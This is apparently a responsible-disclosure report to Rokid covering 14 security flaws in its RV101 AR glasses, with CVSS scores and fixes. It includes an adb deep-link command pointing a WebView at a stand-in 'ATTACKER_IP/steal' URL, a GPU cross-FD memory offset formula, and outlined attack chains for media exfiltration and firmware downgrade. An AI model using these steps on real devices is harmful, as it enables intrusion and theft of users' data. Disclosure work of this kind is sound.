# Rokid Product Security Vulnerability Report
> 📌 **事實依據**：本檔涉及裝置世代、kernel config、CVE 狀態、GhostLock 位移與產品結構等事實時，一律以 [`reports/FACTS.md`](FACTS.md) 為準（單一權威事實表；衝突時以該表裁決）。


**To:** security@rokid.com
**From:** Independent Security Researcher
**Date:** February 19, 2026
**Subject:** Notification of Multiple Security Vulnerabilities in Rokid AR Glasses (RV101)
**Report ID:** RKID-SEC-2026-EXT-001
**Confidentiality Level:** Restricted

---

To the Rokid Security Team,

I am an independent security researcher with a long-standing focus on wearable device security. I recently conducted a security assessment of the Rokid AR Glasses (Model RV101) and identified multiple security vulnerabilities. In accordance with the vulnerability reporting mechanism published in your Security Center ([https://global.rokid.com/pages/security-center](https://global.rokid.com/pages/security-center)), I am hereby submitting a complete report in hopes of assisting your company in enhancing product security.

This report strictly adheres to the **principles of responsible disclosure**. No details regarding these vulnerabilities will be publicly disclosed until your company releases a formal security advisory.

---

## I. Affected Product and Version Information

| Item                     | Details                           |
| ------------------------ | --------------------------------- |
| **Product Name**         | Rokid AR Glasses                  |
| **Model**                | RV101 (NEO LUNA-V2)               |
| **Firmware Version**     | 1.12.009-20260109-150201          |
| **Android Version**      | 12 (API 32)                       |
| **Linux Kernel Version** | 5.10.209-perf-gb80a8319d11b       |
| **Security Patch Level** | 2024-07-05                        |
| **SoC Platform**         | Qualcomm (SoC ID 579)             |
| **GPU**                  | Adreno 621v1 (Chip ID: 0x6020100) |

---

## II. Vulnerability Overview

A total of **2 Critical**, **6 High**, and **6 Medium** risk vulnerabilities were identified. They are classified by severity below.

| ID      | Severity    | Vulnerability Name                                                    | CVSS 3.1 |
| ------- | ----------- | --------------------------------------------------------------------- | -------- |
| VULN-01 | 🔴 Critical | Bootloader Unlocked; Verified Boot Disabled                           | 9.8      |
| VULN-02 | 🔴 Critical | Security Patch Outdated by Over 19 Months                             | 9.1      |
| VULN-03 | � High      | GateServiced Root Privilege Network Service Exposed (TCP 8341)        | 8.6      |
| VULN-04 | 🟠 High     | KGSL GPU Driver Cross-FD Memory Access Vulnerability                  | 7.8      |
| VULN-05 | 🟠 High     | TrustZoneAccessService Unauthorized Access                            | 8.4      |
| VULN-06 | 🟠 High     | ADB Persistently Enabled & Pre-loaded Auth Keys Leading to Media Leak | 7.5      |
| VULN-07 | 🟠 High     | OTA Authentication Mechanism Uses Weak Encryption (MD5)               | 7.2      |
| VULN-08 | 🟠 High     | Rokid App WebView XSS & Sensitive Data Leakage                        | 7.5      |
| VULN-09 | 🟡 Medium   | Over-privileged Application (assistserver has 100+ permissions)       | 5.5      |
| VULN-10 | 🟡 Medium   | I2C Device Access Unrestricted (PMIC/Display/Battery Management)      | 5.5      |
| VULN-11 | 🟡 Medium   | dmesg Kernel Log Unrestricted                                         | 5.0      |
| VULN-12 | 🟡 Medium   | SecCamService Security Camera Service Exposed without Auth            | 5.5      |
| VULN-13 | 🟡 Medium   | Camera Privacy LED Can Be Disabled by Software                        | 4.6      |
| VULN-14 | 🟡 Medium   | Application Logs Leak Payment API Keys & Signatures                   | 5.5      |

---

## III. Critical Vulnerabilities Detailed Description

### VULN-01: Bootloader Unlocked; Verified Boot Disabled

**CVSS Score:** 9.8 (Critical)
**CWE Classification:** CWE-693 (Protection Mechanism Failure)

**Technical Description:**
The device's Bootloader is in an unlocked state, and the verified boot state is "orange":

```
ro.boot.flash.locked = 0
ro.boot.verifiedbootstate = orange
ro.boot.vbmeta.device_state = unlocked

```

**Security Impact:**

- Attackers can flash malicious firmware and implant persistent backdoors.
- Verified Boot protection mechanisms are rendered completely ineffective.
- Malicious firmware persists even after a factory reset.
- Combined with ADB access, this constitutes a complete supply chain attack vector.

**Remediation Suggestion:**

1. Lock the Bootloader before mass production shipping.
2. Ensure the OTA update process verifies `vbmeta` signature integrity.
3. Implement runtime integrity check mechanisms.

---

### VULN-02: Security Patch Outdated by Over 19 Months

**CVSS Score:** 9.1 (Critical)
**CWE Classification:** CWE-1104 (Use of Unmaintained Third Party Components)

**Technical Description:**
The device security patch level is 2024-07-05, which is over 19 months old. During this period, Google and Qualcomm have released numerous critical security patches, including but not limited to:

| CVE ID         | Severity | Component              | Description                                     |
| -------------- | -------- | ---------------------- | ----------------------------------------------- |
| CVE-2024-32896 | Critical | Android Framework      | Privilege Escalation                            |
| CVE-2024-29748 | Critical | Kernel                 | Remote Code Execution                           |
| CVE-2024-36971 | High     | Linux Kernel net/route | UAF Vulnerability (Verified device is affected) |
| CVE-2025-21479 | High     | Qualcomm KGSL          | GPU micronode memory corruption                 |

**Remediation Suggestion:**

1. Urgently release a firmware update containing the latest security patches.
2. Establish a monthly or at least quarterly security patch update mechanism.
3. Security patches should not lag by more than 90 days (Android CDD compliance requirement).

---

## IV. High Risk Vulnerabilities Detailed Description

### VULN-03: GateServiced Root Privilege Network Service Exposed

**CVSS Score:** 8.6 (High)
**CWE Classification:** CWE-250 (Execution with Unnecessary Privileges)

**Technical Description:**
`GateServiced` runs with root privileges (UID 0) and listens on TCP port 8341 on all network interfaces:

```
State: LISTEN
Local Address: 0.0.0.0:8341
UID: 0 (root)
SELinux Context: u:r:tee:s0
Capabilities: 000001ffffffffff (All)

```

init.rc configuration:

```
service GateServiced /vendor/bin/GateServiced
    user root
    group root system

```

**Security Impact:**

- Any device reachable on the network can attempt to connect.
- Running as root means that if exploited, the attacker immediately gains the highest privileges.
- Possessing all Linux Capabilities creates an extremely large attack surface.

**Remediation Suggestion:**

1. Bind the service to 127.0.0.1 or limit it to necessary network interfaces only.
2. Reduce service running privileges, following the principle of least privilege.
3. Implement strong authentication and encryption mechanisms.
4. Remove unnecessary Capabilities.

---

### VULN-04: KGSL GPU Driver Cross-FD Memory Access Vulnerability

**CVSS Score:** 7.8 (High)
**CWE Classification:** CWE-284 (Improper Access Control)

**Technical Description:**
The Qualcomm KGSL GPU driver (`/dev/kgsl-3d0`, mode 0666) shares GPU memory page tables across multiple file descriptors (FD) within the same process. Attackers can access GPU memory allocated by one FD via another FD by calculating the `mmap` offset.

**PoC Verification Results:**

```
fd1 allocates memory: gpuaddr=0x4000000000
fd1 writes secret value: 0xaabbccdd11223344
fd2 reads via mmap offset=0x1000: 0xaabbccdd11223344 ✅
fd2 modifies, changes visible to fd1 ✅ CONFIRMED

```

**Offset Calculation Formula:**

```
offset = (page_index + 1) * 0x1000
page_index = (gpuaddr - 0x4000000000) / 0x1000

```

**Security Impact:**

- Bypasses FD isolation mechanisms, potentially causing sandbox escape.
- Can read sensitive GPU data from other FDs (e.g., ML model weights, encryption buffers).
- Can tamper with GPU data of other FDs; if combined with GPU Contexts of privileged processes like SurfaceFlinger, privilege escalation may be achieved.

**Additional Findings:**

1. **Double mmap Physical Page Sharing:** Multiple mmaps to the same GPU address map to the same physical page, serving as a TOCTOU attack vector.
2. **Mapping Remains Valid After FD Close:** All 100 mmap mappings created remain readable/writable after closing the FD, presenting a memory leak risk.

**Remediation Suggestion:**

1. Ensure each FD has independent GPU memory page tables.
2. Restrict access permissions for `/dev/kgsl-3d0` (currently 0666, recommend restricting).
3. Force release of all mmap mappings when an FD is closed.

---

### VULN-05: TrustZoneAccessService Unauthorized Access

**CVSS Score:** 8.4 (High)
**CWE Classification:** CWE-862 (Missing Authorization)

**Technical Description:**
`TrustZoneAccessService` is an exported service with no permission requirements:

```xml
<service android:name="...TZAccessService"
    android:enabled="true"
    android:exported="true">  <!-- Accessible by any app -->
```

In the whitelist configuration `/vendor/etc/ssg/tz_whitelist.json`, the `permissions` field for all TAs (Trusted Applications) is an empty array, including sensitive functions like App Loader, Device Attestation, and Haven Token.

**Security Impact:**

- Any third-party app can bind to and access TrustZone Trusted Applications.
- Potential to acquire device attestation keys.
- Complete bypass of the Android security model.

**Remediation Suggestion:**

1.  Set `android:exported` to `false` or add signature-level permission protection.
2.  Set explicit permission requirements for each TA in the whitelist.
3.  Implement caller identity verification.

---

### VULN-06: ADB Persistently Enabled & Pre-loaded Auth Keys Leading to Zero-Click Media Leak

**CVSS Score:** 4.6 (Medium) / 7.5 (High) if WiFi ADB is enabled
**CWE Classification:** CWE-921 (Storage of Sensitive Data in a Mechanism without Access Control)

**Technical Description:**
ADB is enabled by default on the device and cannot be disabled by the user:

```
persist.sys.usb.config = adb,diag
persist.vendor.adb = true
lockscreen.disabled = 1
```

More critically, `/data/misc/adb/adb_keys` contains pre-loaded authorization keys, including a `root@raspberrypi` key (suspected leftover factory test key).

**Verified Data Leakage Scope:**

| Data Type         | Quantity                       | Description                                                                                             |
| :---------------- | :----------------------------- | :------------------------------------------------------------------------------------------------------ |
| Photos            | All                            | /sdcard/DCIM/Camera/                                                                                    |
| Videos            | All (incl. 2400×1800@30fps HD) | /sdcard/Movies/Camera/                                                                                  |
| Screenshots       | All                            | /sdcard/Screenshots/                                                                                    |
| Screen Recordings | All                            | /sdcard/ScreenRecorder/                                                                                 |
| IMU Sensor Data   | 700k+ lines                    | Gyroscope/accelerometer data attached to every video; can reconstruct wearer's head movement trajectory |

Complete exfiltration takes only about 2-3 minutes (USB 3.0), requiring no user confirmation, no root, and no exploitation of code vulnerabilities.

**Attack Scenarios:**

- **Malicious Charging Cable Attack:** A disguised charging station can steal all media data within minutes.
- **Supply Chain Attack:** If the `root@raspberrypi` key pair is universal across devices, anyone holding the private key can access all shipped devices.

**Remediation Suggestion:**

1.  **P0 Urgent:** Disable ADB in production firmware (remove `persist.vendor.adb=true`).
2.  **P0 Urgent:** Clear `/data/misc/adb/adb_keys` before shipping to remove factory test keys.
3.  **P0 Urgent:** Remove Qualcomm `diag` USB interface.
4.  Implement user confirmation mechanism for ADB connections.
5.  Enable USB restricted mode (Charge Only) by default.

---

### VULN-07: OTA Authentication Mechanism Uses Weak Encryption

**CVSS Score:** 7.2 (High)
**CWE Classification:** CWE-328 (Use of Weak Hash)

**Technical Description:**
The OTA update check API (`POST https://ota.rokid.com/v1/extended/ota/check`) uses the following authentication method:

1.  Symmetric keys (`key` and `secret`) are hardcoded in system properties `ro.boot.key` and `ro.boot.secret`.
2.  The signature algorithm is a simple MD5 hash (not HMAC).
3.  No server-side nonce; relies only on timestamps to prevent replay.

Through ADB, all authentication parameters can be read, and a complete OTA API call script has been successfully constructed to query arbitrary firmware update info and download links.

**Security Impact:**

- Attackers can forge OTA requests to obtain firmware download links.
- MD5 has known collision vulnerabilities; signatures can be forged.
- Combined with Bootloader unlocking, malicious firmware downgrade attacks can be executed.

**Remediation Suggestion:**

1.  Switch to HMAC-SHA256 or asymmetric signatures (RSA/ECDSA).
2.  Store keys in a Hardware Security Module (e.g., TrustZone) instead of system properties.
3.  Implement server-side nonce to prevent replay attacks.
4.  Add expiration mechanisms to firmware download links.

---

### VULN-08: Rokid App WebView XSS & Sensitive Data Leakage

**CVSS Score:** 7.5 (High)
**CWE Classification:** CWE-79 (Cross-site Scripting), CWE-532 (Information Exposure Through Log Files)

**Technical Description:**

**WebView XSS (Verified):**
`JoyGoWebviewActivity` (JD Financial SDK) is exported and supports a BROWSABLE intent filter. It can load arbitrary URLs and execute JavaScript via the `joygorokid://open?url=` scheme:

```bash
adb shell am start -a android.intent.action.VIEW \
    -d 'joygorokid://open?url=http://ATTACKER_IP/steal'

```

**Sensitive Data Leakage in Logs (Severe):**
Application logs (readable without root, requiring only `READ_LOGS` permission or ADB) leak the following sensitive information:

| Leaked Item                                       | Risk                                |
| ------------------------------------------------- | ----------------------------------- |
| Alipay RPC Complete Payload (incl. SN, Signature) | 🔴 Payment request forgery possible |
| Payment AppKey: `<REDACTED_PAYMENT_APPKEY>`         | 🔴 Payment identity forgery         |
| Google Maps API Key                               | 🟡 Billing abuse                    |
| Device UTDID and Fingerprint                      | 🟡 Device tracking                  |

**Remediation Suggestion:**

1. Remove the `exported` attribute of `JoyGoWebviewActivity` or add URL whitelist validation.
2. Completely scrub sensitive information from logs (API keys, payment parameters, authentication signatures).
3. Restrict logcat access permissions.

---

## V. Medium Risk Vulnerabilities Summary

| ID      | Vulnerability         | Description                                                                                                                     | Remediation Suggestion                                                       |
| ------- | --------------------- | ------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| VULN-09 | Over-privileged App   | `com.rokid.os.sprite.assistserver` holds 100+ system permissions, including INJECT_EVENTS, MASTER_CLEAR, INSTALL_PACKAGES, etc. | Audit and remove unnecessary permissions based on least privilege principle. |
| VULN-10 | Unrestricted I2C      | `/dev/i2c-1` (mode 0666) allows access to hardware like PMIC (0x08), Display Controller (0x30), Battery IC (0x64).              | Restrict access permissions for I2C device files.                            |
| VULN-11 | Unrestricted dmesg    | `dmesg_restrict=0`, allowing any app to read kernel logs, leaking memory addresses and security events.                         | Set `kernel.dmesg_restrict=1`.                                               |
| VULN-12 | SecCamService Exposed | `exported=true` with no permission requirements; exposes Native JNI methods for security camera functions.                      | Set exported=false or add permission controls.                               |
| VULN-13 | Camera LED Disabling  | `CAMERA_DISABLE_TRANSMIT_LED` permission exists; malicious apps can record without user knowledge.                              | Enforce LED activation at the hardware level.                                |
| VULN-14 | Payment Info in Logs  | Alipay RPC, API keys, and device fingerprints are recorded in logcat.                                                           | Clean all sensitive log outputs.                                             |

---

## VI. Known Exploitation Methods

The following exploitation paths have been verified for the vulnerabilities in this report:

### Path A: ADB Physical Access Attack Chain

```
USB Physical Connection → ADB Auto-connect (Pre-loaded Keys) → Full Media Data Exfiltration (incl. IMU) → Zero-Click Completion

```

### Path B: TrustZone Attack Chain

```
Normal App → Bind TrustZoneAccessService → Access App Loader TA → Potential TEE Privilege Acquisition

```

### Path C: KGSL GPU Attack Chain

```
/dev/kgsl-3d0 Access → Cross-FD Memory R/W → Attempt to Tamper with SurfaceFlinger GPU Command Buffer → Potential Privilege Escalation

```

### Path D: OTA Downgrade Attack Chain

```
Read System Properties for OTA Keys → Forge API Request → Acquire Firmware → Bootloader Unlock & Flash Malicious Firmware

```

---

## VII. Recommended Remediation Priority

### Priority 1 (Suggest handling within 7 days)

| Item                                                         | Impact                                       |
| ------------------------------------------------------------ | -------------------------------------------- |
| Lock Bootloader                                              | Prevent malicious firmware flashing.         |
| Release Security Patch Update (at least to 2025 patch level) | Fix known kernel and driver vulnerabilities. |
| Disable ADB in production firmware; clear pre-loaded keys    | Prevent zero-click media exfiltration.       |
| Limit GateServiced listening scope and permissions           | Reduce network attack surface.               |

### Priority 2 (Suggest handling within 30 days)

| Item                                                             | Impact                           |
| ---------------------------------------------------------------- | -------------------------------- |
| Fix exported issues in TrustZoneAccessService / SecCamService    | Prevent unauthorized TEE access. |
| Update OTA authentication mechanism to asymmetric signatures     | Prevent firmware forgery.        |
| Restrict access permissions for `/dev/kgsl-3d0` and `/dev/i2c-1` | Reduce hardware attack surface.  |
| Set `dmesg_restrict=1`                                           | Prevent kernel info leakage.     |

### Priority 3 (Suggest handling within 90 days)

| Item                                                                        | Impact                               |
| --------------------------------------------------------------------------- | ------------------------------------ |
| Comprehensive audit of application permissions (assistserver, Alipay, etc.) | Adhere to least privilege principle. |
| Scrub sensitive info from all logs                                          | Prevent API key leakage.             |
| Enforce Camera LED at hardware level                                        | Protect user privacy.                |
| Establish periodic security update mechanism                                | Long-term security maintenance.      |

---

## VIII. Compliance Concerns

| Standard        | Impact                                                                                                         |
| --------------- | -------------------------------------------------------------------------------------------------------------- |
| **GDPR**        | AR glasses can capture images of others; zero-protection leakage of media data constitutes a serious PII risk. |
| **Android CDD** | Security patch lag exceeds 90 days, failing Google compliance requirements.                                    |
| **PCI DSS**     | API keys and signatures for payment functions are leaked in logs.                                              |

---

## IX. Expected Disclosure Timeline

| Date       | Event                                                                                       |
| ---------- | ------------------------------------------------------------------------------------------- |
| 2026-02-19 | Submit this report to Rokid Security Team.                                                  |
| 2026-02-21 | Expect confirmation reply from your company (per your 48-hour commitment).                  |
| 2026-05-19 | 90-day grace period (industry standard); if unpatched, public disclosure will be evaluated. |

I commit to not disclosing vulnerability details to the public before Rokid releases a formal security advisory. If your company requires an extension for remediation, please communicate a reasonable timeline via email.

---

## X. Attachments

I can provide the following supplementary materials if needed:

1. **Source Code for PoCs** (incl. KGSL cross-FD access, OTA auth cracking scripts, etc.)
2. **APK Decompilation Analysis Results** (TrustZoneAccessService, SecCamService, RokidSysConfig, etc.)
3. **Complete Technical Analysis Reports** (Independent reports for each vulnerability, including reproduction steps)
4. **Logcat Capture Samples** (PII redacted)

---

## XI. Contact Information

For any questions or further technical discussion, please contact via:

- **Email:** [<RESEARCHER_EMAIL>]

I look forward to your prompt response and remediation plan. I am more than willing to assist in verifying the effectiveness of the remediation measures.

Sincerely,

Independent Security Researcher
February 19, 2026

---

_This report is written based on the principles of responsible disclosure. All tests were conducted on the researcher's own devices and did not cause damage to or leakage of any third-party data._
